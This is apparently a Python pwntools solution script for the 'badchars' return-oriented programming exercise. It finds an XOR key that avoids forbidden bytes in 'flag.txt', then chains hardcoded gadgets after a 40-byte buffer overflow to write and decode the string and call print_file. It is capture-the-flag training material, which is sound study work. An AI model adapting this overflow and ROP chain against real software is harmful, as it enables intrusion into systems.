#!/usr/bin/python3 

import binascii 
from pwn import *

def find_xor_value(sh, badchars):
    #Loop 0 to 255
    for i in range(255):
        flag = True
        # 8 loops, for 8 bytes we concat the result of the xor
        new_sh = "".join([chr(i^ord(sh[x])) for x in range(len(sh))])
        #print(new_sh)
        #Now we loop through all bad chars and if it's found in new string we ignore it
        for b in badchars:
            if b in new_sh:
                flag = False
        #If we made it past the bad character check we print out the result and exit
        if flag:
            print (sh+"^"+str(i)+"="+new_sh)
            print (binascii.hexlify(str.encode(new_sh)))
            return i,new_sh
    return 0,sh

string_to_xor="flag.txt"
badchars=['x', 'g', 'a', '.']
xor_value, xored_string = find_xor_value(string_to_xor, badchars)
#print (string_to_xor+"^"+str(xor_value)+"="+xored_string)



elf = context.binary = ELF('badchars')

info("%#x print_file", elf.symbols.print_file)
print_file = p64(elf.symbols.print_file)


offset=40

xored_string=p64(0x646e63652c767a76, endianness="big")
xor_value=p64(2)
writable_addr = p64(0x00601038)
gadget_pop_r12_r13_r14_r15 = p64(0x000000000040069c)
gadget_mov_r13_r12 = p64(0x0000000000400634)
gadget_pop_r14_r15 = p64(0x00000000004006a0)
gadget_xor_r15_r14 = p64(0x0000000000400628)
gadget_pop_rdi = p64(0x00000000004006a3)
print_file = p64(0x00400510)

r12 = xored_string
r13 = writable_addr
r14 = xor_value
r15 = writable_addr
# Write dnce,vzv in .bss
payload = b'A'*offset \
    + gadget_pop_r12_r13_r14_r15 + r12 + r13 + r14 + r15 \
    + gadget_mov_r13_r12 

# ^2 each char
for i in range(8):
    payload +=  gadget_pop_r14_r15 + r14 + p64(0x00601038+i) \
    + gadget_xor_r15_r14    

# Call print_file
payload += gadget_pop_rdi + writable_addr \
    + print_file




io = process(elf.path)
io.sendline(payload)
io.interactive()
while 1:
    try:
        print(io.recvline().decode())
    except:
        exit()
